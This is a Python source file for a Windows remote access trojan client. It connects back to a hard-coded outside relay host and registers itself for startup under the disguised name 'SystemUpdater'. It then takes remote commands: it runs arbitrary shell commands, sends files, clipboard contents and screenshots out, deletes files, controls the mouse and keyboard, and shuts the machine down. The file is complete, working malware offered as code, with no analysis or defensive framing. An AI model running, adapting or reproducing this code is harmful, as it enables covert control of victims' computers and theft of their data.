import socket
import subprocess  
import time
import os
import shutil
import pyautogui
import pyperclip
import platform 

SERVER_IP = "lachowski-57687.portmap.host" 
PORT = 57687

def send_data(sock, data):
    try:
        if isinstance(data, str):
            data = data.encode()
        sock.sendall(data)
    except:
        pass

# ============================================
# PERSISTENCE FUNCTION (FIXED - OUTSIDE send_data)
# ============================================
def add_persistence():
    """Add the client to Windows startup"""
    try:
        import winreg
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key_handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        
        # Get the current executable path
        # If running as .exe, use sys.executable; if .py, use __file__
        import sys
        if getattr(sys, 'frozen', False):
            # Running as compiled .exe
            exe_path = sys.executable
        else:
            # Running as .py script
            exe_path = os.path.abspath(__file__)
        
        winreg.SetValueEx(key_handle, "SystemUpdater", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key_handle)
        return True
    except Exception as e:
        print(f"[-] Persistence failed: {str(e)}")
        return False

# ============================================
# CONNECT TO SERVER
# ============================================
while True:
    try:
        s = socket.socket()
        s.connect((SERVER_IP, PORT))
        break
    except:
        time.sleep(5)

# ============================================
# ADD PERSISTENCE (NOW ACTUALLY CALLED)
# ============================================
add_persistence()

# ============================================
# MAIN COMMAND LOOP
# ============================================
while True:
    try:
        command = s.recv(4096).decode().strip()
        
        if command.lower() == "exit":
            break
            
        # System info command
        elif command.lower() == "sysinfo":
            try:
                cpu_info = subprocess.getoutput("wmic cpu get name /value").strip()
                gpu_info = subprocess.getoutput("wmic path win32_VideoController get name /value").strip()
                ram_info = subprocess.getoutput("wmic computersystem get TotalPhysicalMemory /value").strip()
                
                info = (
                    f"System: {platform.system()}\n"
                    f"Node Name: {platform.node()}\n"
                    f"Release: {platform.release()}\n"
                    f"Version: {platform.version()}\n"
                    f"Machine: {platform.machine()}\n"
                    f"Processor: {platform.processor()}\n"
                    f"CPU: {cpu_info}\n"
                    f"GPU: {gpu_info}\n"
                    f"RAM: {ram_info}\n"
                )
                send_data(s, info)
            except Exception as e:
                send_data(s, f"[-] Sysinfo failed: {str(e)}\n")
                
        # User info command
        elif command.lower() == "whoami":
            try:
                output = subprocess.getoutput("whoami")
                send_data(s, (output + "\n").encode())
            except Exception as e:
                send_data(s, f"[-] whoami failed: {str(e)}\n")
                
        # Current working directory
        elif command.lower() == "cwd":
            try:
                cwd = os.getcwd()
                send_data(s, (cwd + "\n").encode())
            except Exception as e:
                send_data(s, f"[-] cwd failed: {str(e)}\n")
                
        # Change directory
        elif command.startswith("cd "):
            path = command[3:].strip()
            try:
                os.chdir(path)
                send_data(s, f"[+] Changed directory to {path}\n")
            except Exception as e:
                send_data(s, f"[-] cd failed: {str(e)}\n")
                
        # Execute shell command
        elif command.startswith("shell "):
            cmd = command[6:].strip()
            try:
                output = subprocess.getoutput(cmd)
                send_data(s, (output + "\n").encode())
            except Exception as e:
                send_data(s, f"[-] shell command failed: {str(e)}\n")
                
        # Mouse movement
        elif command.startswith("mousemove "):
            try:
                parts = command.split()
                if len(parts) == 3:
                    x = int(parts[1])
                    y = int(parts[2])
                    pyautogui.moveTo(x, y)
                    send_data(s, "[+] Mouse moved.\n")
                else:
                    send_data(s, "[-] Usage: mousemove <x> <y>\n")
            except Exception as e:
                send_data(s, f"[-] mousemove failed: {str(e)}\n")
                
        # Left click
        elif command.lower() == "click":
            try:
                pyautogui.click()
                send_data(s, "[+] Left click performed.\n")
            except Exception as e:
                send_data(s, f"[-] click failed: {str(e)}\n")
                
        # Right click
        elif command.lower() == "rightclick":
            try:
                pyautogui.rightClick()
                send_data(s, "[+] Right click performed.\n")
            except Exception as e:
                send_data(s, f"[-] rightclick failed: {str(e)}\n")
                
        # Type text
        elif command.startswith("type "):
            text = command[5:].strip()
            try:
                pyautogui.write(text)
                send_data(s, "[+] Text typed.\n")
            except Exception as e:
                send_data(s, f"[-] type failed: {str(e)}\n")
                
        # Paste text
        elif command.startswith("paste "):
            text = command[6:].strip()
            try:
                pyperclip.copy(text)
                pyautogui.hotkey('ctrl', 'v')
                send_data(s, "[+] Text pasted.\n")
            except Exception as e:
                send_data(s, f"[-] paste failed: {str(e)}\n")
                
        # Copy clipboard content
        elif command.lower() == "copyclip":
            try:
                content = pyperclip.paste()
                send_data(s, f"[+] Clipboard content: {content}\n")
            except Exception as e:
                send_data(s, f"[-] Failed to get clipboard: {str(e)}\n")
                
        # Upload file
        elif command.startswith("upload "):
            file_path = command[7:].strip()
            try:
                send_data(s, "[READY]")
                with open(file_path, "wb") as f:
                    while True:
                        data = s.recv(1024)
                        if b"<ENDUPLOAD>" in data:
                            f.write(data.replace(b"<ENDUPLOAD>", b""))
                            break
                        f.write(data)
                send_data(s, "[+] File received and saved.\n")
            except Exception as e:
                send_data(s, f"[-] Upload failed: {str(e)}\n")
                
        # Download file
        elif command.startswith("download "):
            file_path = command[9:].strip()
            try:
                with open(file_path, "rb") as f:
                    while chunk := f.read(1024):
                        s.send(chunk)
                s.send(b"<ENDDOWNLOAD>")
            except Exception as e:
                send_data(s, f"[-] Download failed: {str(e)}\n")
                
        # Delete file or directory
        elif command.startswith("delete "):
            path = command[7:].strip()
            try:
                if os.path.isdir(path):
                    shutil.rmtree(path)
                else:
                    os.remove(path)
                send_data(s, f"[+] Deleted '{path}'.\n")
            except Exception as e:
                send_data(s, f"[-] Delete failed: {str(e)}\n")
                
        # List directory contents
        elif command.startswith("list "):
            path = command[5:].strip()
            try:
                items = os.listdir(path)
                result = ""
                for item in items:
                    item_path = os.path.join(path, item)
                    if os.path.isdir(item_path):
                        result += f"[DIR]  {item}\n"
                    else:
                        size = os.path.getsize(item_path)
                        result += f"[FILE] {item} ({size} bytes)\n"
                send_data(s, result.encode())
            except Exception as e:
                send_data(s, f"[-] List failed: {str(e)}\n")
                
        # Move files or directories
        elif command.startswith("move "):
            try:
                parts = command[5:].strip().split(' ', 1)
                if len(parts) != 2:
                    send_data(s, "[-] Usage: move <source_path> <destination_path>\n")
                    continue
                src, dst = parts
                shutil.move(src, dst)
                send_data(s, f"[+] Moved '{src}' to '{dst}'.\n")
            except Exception as e:
                send_data(s, f"[-] Move failed: {str(e)}\n")
                
        # Search for files
        elif command.startswith("search "):
            filename = command[7:].strip()
            try:
                found = []
                search_paths = ["C:\\Users", "C:\\Program Files", "C:\\Program Files (x86)", "C:\\Windows"]
                
                for search_path in search_paths:
                    if os.path.exists(search_path):
                        for root, dirs, files in os.walk(search_path):
                            for file in files:
                                if filename.lower() in file.lower():
                                    found.append(os.path.join(root, file))
                                    if len(found) >= 50:
                                        break
                            if len(found) >= 50:
                                break
                    if len(found) >= 50:
                        break
                        
                if found:
                    result = f"Found {len(found)} matches:\n" + "\n".join(found[:50])
                    if len(found) == 50:
                        result += "\n... (showing first 50 results)"
                    send_data(s, (result + "\n").encode())
                else:
                    send_data(s, "[-] File not found.\n")
            except Exception as e:
                send_data(s, f"[-] Search failed: {str(e)}\n")
                
        # Directory tree
        elif command.startswith("tree "):
            path = command[5:].strip()
            try:
                result = subprocess.getoutput(f'tree "{path}" /F')
                send_data(s, (result + "\n").encode())
            except Exception as e:
                send_data(s, f"[-] Tree failed: {str(e)}\n")
                
        # Take screenshot
        elif command.lower() == "screenshot":
            try:
                screenshot = pyautogui.screenshot()
                screenshot.save("screenshot.png")
                with open("screenshot.png", "rb") as f:
                    while chunk := f.read(1024):
                        s.send(chunk)
                s.send(b"<ENDSCREENSHOT>")
                os.remove("screenshot.png")
            except Exception as e:
                send_data(s, f"[-] Screenshot error: {str(e)}")
                
        # System shutdown
        elif command.lower() == "shutdown":
            try:
                subprocess.call("shutdown /s /t 0", shell=True)
                send_data(s, "[+] Shutdown initiated.\n")
            except Exception as e:
                send_data(s, f"[-] Shutdown failed: {str(e)}\n")
                
        # System restart
        elif command.lower() == "restart":
            try:
                subprocess.call("shutdown /r /t 0", shell=True)
                send_data(s, "[+] Restart initiated.\n")
            except Exception as e:
                send_data(s, f"[-] Restart failed: {str(e)}\n")
                
        # User logoff
        elif command.lower() == "logoff":
            try:
                subprocess.call("shutdown /l", shell=True)
                send_data(s, "[+] Logoff initiated.\n")
            except Exception as e:
                send_data(s, f"[-] Logoff failed: {str(e)}\n")
                
        # Lock screen
        elif command.lower() == "lock":
            try:
                subprocess.call("rundll32.exe user32.dll,LockWorkStation", shell=True)
                send_data(s, "[+] Screen locked.\n")
            except Exception as e:
                send_data(s, f"[-] Lock failed: {str(e)}\n")
                
        # Hibernate system
        elif command.lower() == "hibernate":
            try:
                subprocess.call("shutdown /h", shell=True)
                send_data(s, "[+] Hibernate initiated.\n")
            except Exception as e:
                send_data(s, f"[-] Hibernate failed: {str(e)}\n")
                
        # List running processes
        elif command.lower() == "processes":
            try:
                output = subprocess.check_output("tasklist /fo table", shell=True)
                send_data(s, output + b"\n")
            except Exception as e:
                send_data(s, f"[-] Failed to list processes: {str(e)}\n")
                
        # Close connection
        elif command.lower() == "close":
            try:
                send_data(s, "[+] Connection closed by client.\n")
                s.close()
                break
            except Exception as e:
                break
                
        # Run application
        elif command.startswith("run "):
            app = command[4:].strip()
            try:
                subprocess.Popen(app, shell=True)
                send_data(s, "[+] App launched.\n")
            except Exception as e:
                send_data(s, f"[-] Failed to launch app: {str(e)}\n")
                
        # Close application
        elif command.startswith("close "):
            app = command[6:].strip()
            try:
                subprocess.call(f"taskkill /im {app}.exe /f", shell=True)
                send_data(s, "[+] App closed.\n")
            except Exception as e:
                send_data(s, f"[-] Failed to close app: {str(e)}\n")
                
        # Default: execute as shell command
        else:
            try:
                output = subprocess.getoutput(command)
                send_data(s, (output + "\n").encode())
            except Exception as e:
                send_data(s, f"[-] Command failed: {str(e)}\n")
                
    except Exception as e:
        try:
            send_data(s, f"[-] Error: {str(e)}\n")
        except:
            break

s.close()
